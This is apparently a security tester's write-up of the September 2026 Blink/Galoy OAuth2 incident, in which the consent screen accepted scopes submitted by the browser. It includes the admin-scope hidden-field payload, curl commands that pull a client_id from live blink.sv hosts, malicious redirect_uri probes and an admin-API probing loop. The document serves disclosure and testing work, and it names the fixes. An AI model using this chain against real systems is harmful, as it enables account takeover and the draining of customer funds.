# Consent-screen scope confusion — the three-layer OAuth2 permission bug

Source incident: **Blink Technologies (`blink.sv`), 19 September 2026 — 6.61085425 BTC (~$700k)
drained from 24 of 35 taken-over accounts**, disclosed in full by the vendor in
`https://www.blink.sv/blog/sept-19-attack-postmortem-and-bounty`. The platform is the open-source
**Galoy** Lightning stack (`github.com/GaloyMoney/galoy`), so the vulnerable code is still readable —
the walkthrough below is from a fresh clone, not from the advisory.

This is the highest-yield thing to test on any OAuth2-fronted estate, because **every layer involved
looks correct in isolation** and the token is minted by the target's own identity provider, so no
anomaly detector fires.

---

## 1. The exploit chain, as the vendor described it

> "From October 2023 until 19 September 2026, anyone with a free account and a web browser could give
> themselves the powers of our support staff: change the email address or phone number on any
> customer's account, then log in as that customer and raise their withdrawal limits."

> "Three separate things were wrong... The consent screen trusted the browser... The admin API trusted
> any token... The admin server trusted the permissions string."

> "The attacker tried the obvious route first — adding permissions on the main authorization request —
> and our configuration correctly rejected it. Then they tried the consent page, and it let them
> through."

That last paragraph is the whole shape of the class: **the authorization endpoint validates scopes,
the consent screen does not.**

---

## 2. Layer 1 — consent screen takes the grant list from the form

`apps/consent/app/consent/page.tsx` (Galoy). The scope checkboxes are rendered as ordinary form
inputs, and the submit handler trusts whatever came back:

```tsx
// the widget: one checkbox per requested scope
const ScopeItem = ({ scope }) => (
  <label htmlFor={scope}>
    <span>{scope}</span>
    <input type="checkbox" id={scope} value={scope} name="grant_scope" />
  </label>
)

// the server action
const submitForm = async (form: FormData) => {
  "use server"
  const consent_challenge = form.get("consent_challenge")
  const grantScope = form.getAll("grant_scope").map((v) => v.toString())   // <-- from the BROWSER

  const body = (await hydraClient.getOAuth2ConsentRequest({ consentChallenge })).data
  const responseConfirm = await hydraClient.acceptOAuth2ConsentRequest({
    consentChallenge,
    acceptOAuth2ConsentRequest: {
      grant_scope: grantScope,                                     // <-- passed through UNCHECKED
      grant_access_token_audience: body.requested_access_token_audience,  // <-- this one IS server-side
      remember, remember_for: 3600,
    },
  })
  redirect(responseConfirm.data.redirect_to)
}
```

Note the asymmetry: the **audience** is taken from the server's own `getOAuth2ConsentRequest` response
(correct), while the **scope** is taken from the browser (wrong). `grantScope` is never compared to
`body.requested_scope`. An attacker adds one hidden field to the form:

```html
<input type="hidden" name="grant_scope" value="admin">
```

and the OAuth server — correctly trusting its own consent page — mints a valid token that says `admin`.

Grep for the pattern, it is not subtle:

```bash
grep -rn "grant_scope\|grantScope\|requested_scope" apps/consent/ lib/ core/ | grep -v node_modules
# any `getAll("grant_scope")` with no subsequent comparison against requested_scope is the bug
```

The `!` fix is a set-difference: **reject any submitted scope not present in `body.requested_scope`.**

---

## 3. Layer 2 — the gatekeeper accepted any live token (Ory Oathkeeper)

`dev/config/ory/oathkeeper_rules.yaml` — the reverse proxy in front of the admin GraphQL API:

```yaml
- id: admin-backend
  upstream: { url: "http://bats-tests:4001", strip_path: /admin }
  match: { url: "<(http|https)>://<.*><[0-9]+>/admin<.*>", methods: [GET, POST, OPTIONS] }
  authenticators:
    - handler: cookie_session
      config: { check_session_url: http://host.docker.internal:3004/api/auth/session, ... }
    - handler: oauth2_introspection                 # accepts ANY live token from Hydra
      config: { introspection_url: http://hydra:4445/admin/oauth2/introspect,
                token_from: { header: Oauth2-Token } }
  authorizer:
    handler: allow                                  # no required scope, no client check
  mutators:
    - handler: id_token
      config: #! TODO: add aud: {"aud": ["https://api/admin/graphql"] }
        claims: '{"sub": "{{ print .Subject }}", "scope": "{{ print .Extra.scope }}" }'
```

Three separate tells, any one of which is the finding:

1. `handler: allow` **plus** an `oauth2_introspection` authenticator = *any* token issued by the IdP
   authenticates to this API. There is no permission requirement and no client restriction.
2. The `id_token` mutator copies `scope` straight out of the introspection response — i.e. **out of the
   token's own claim**. The downstream service then reads its authority from a value the holder
   supplied.
3. `#! TODO: add aud: {...}` — the audience was never set. That TODO *is* the missing control; a rule
   file full of these comments is a target map. (Blink's fix, `PR #855`, added exactly this `aud`.)

The **same TODO appears on the public backend rule** in the same file (with `"aud": ["https://api/graphql"]`),
so check every rule, not just the admin one.

---

## 4. Layer 3 — the API trusted the permission string

The post-mortem is blunt: *"If the string said admin, you were admin. There was no check that the
person behind the token was a known administrator."* A May-2026 "hardening" PR that added
admin-permission requirements **read those permissions from the token itself** — which is not a
control at all when layer 1 lets the attacker put them there.

Rule: **authorization must bind to the subject**, never to a claim the subject's own request caused to
be minted. Compare against a server-side admin registry (user id → role), not `token.scope`.

---

## 5. Client enumeration: NextAuth leaks `client_id` (and you need it)

To reach the consent screen you need a `client_id`. NextAuth (Auth.js) deliberately hides the client
id from `/api/auth/providers`:

```bash
curl -s https://pay.blink.sv/api/auth/providers
# {"blink":{"id":"blink","name":"Blink","type":"oauth",
#           "signinUrl":"https://pay.blink.sv/api/auth/signin/blink",
#           "callbackUrl":"https://pay.blink.sv/api/auth/callback/blink"}}
```

But the sign-in POST redirects to the IdP with the whole authorize URL in `Location`:

```bash
CSRF=$(curl -s -c jar https://pay.blink.sv/api/auth/csrf | jq -r .csrfToken)
curl -s -b jar -c jar -D - -o /dev/null -X POST https://pay.blink.sv/api/auth/signin/blink \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "csrfToken=$CSRF" --data-urlencode "callbackUrl=https://pay.blink.sv/"
# location: https://oauth.blink.sv/oauth2/auth?client_id=f6622960-9fb6-4a1d-a5be-f7b4b6584c22
#           &scope=read&response_type=code
#           &redirect_uri=https%3A%2F%2Fpay.blink.sv%2Fapi%2Fauth%2Fcallback%2Fblink&state=...
```

Do this for **every** NextAuth app you can reach — the `scope=` value tells you which clients are
trusted with `write`, and the dashboard/admin client is the interesting one. On Blink:
`pay.blink.sv` → `read`; `dashboard.blink.sv` → `read write`.

---

## 6. Validation probes that cost nothing (do them before anything stateful)

Against `https://oauth.blink.sv/oauth2/auth` with a real `client_id`:

```
scope=read write            -> 303 (proceeds; only fails on too-short state)
scope=read write admin      -> 303 error=invalid_scope "not allowed to request scope 'admin'"   <-- CONTROL WORKS
scope=admin                 -> 303 error=invalid_scope                                          <-- CONTROL WORKS
scope=read write receive    -> 303 error=invalid_scope "not allowed to request scope 'receive'"
scope=openid                -> 303 error=invalid_scope "not allowed to request scope 'openid'"
scope=bogus_scope           -> 303 error=invalid_scope
redirect_uri=https://evil.example/cb                       -> invalid_request
redirect_uri=https://dashboard.blink.sv.evil.com/cb        -> invalid_request
redirect_uri=https://dashboard.blink.sv/.../../../evil     -> invalid_request
```

Two rules for the report:

- **Write these negatives up as a control that works.** "The obvious route is closed" is a real
  sentence in a disclosure and it shows the tester understood the history.
- **A rejection here does not clear the consent screen.** They are separate code paths; that is the
  entire lesson of the incident.

Other free checks: `GET /.well-known/openid-configuration` (grant types, response types, PKCE methods,
`require_request_uri_registration`), `POST /oauth2/register` (**DCR** — Blink: `404 Dynamic
registration is not enabled`, i.e. closed; a 200 here is its own finding), `POST /oauth2/token` with
`grant_type=client_credentials` and no secret → `invalid_client`.

---

## 7. Adjacent: the admin API's public reachability

The post-mortem says the admin API and panel were moved off the public internet (VPN-only) on 24 Sep.
Re-verify rather than trusting it — it is a one-command check and a live admin API would be critical:

```bash
for p in / /admin /admin/graphql /graphql /api /metrics /health /version /openapi.json; do
  printf "%-18s " "$p"; curl -s -o /dev/null -w "%{http_code}\n" "https://admin-api.<target>$p"; done
# 404 on everything except /healthz (200, empty body) == nginx front with no routed paths == not usable.
```

---

## 8. Transferable checklist

| # | Check | Why |
|---|---|---|
| 1 | grep the consent app for `grant_scope` taken from the form, with no comparison to `requested_scope` | layer 1 |
| 2 | read the reverse-proxy/authorizer rule file for `handler: allow` + token introspection, and for `#! TODO: add aud` | layer 2 |
| 3 | does the API authorize on a **claim** or on a **server-side subject lookup**? | layer 3 |
| 4 | pull `client_id` + allowed `scope` from every NextAuth app's signin redirect | you need a client to test at all |
| 5 | probe `/oauth2/auth` with an elevated scope for `invalid_scope` | free, unauthenticated, and produces the "control works" line |
| 6 | confirm the consent screen was actually re-tested, not just the authorize endpoint | the incident's entire point |
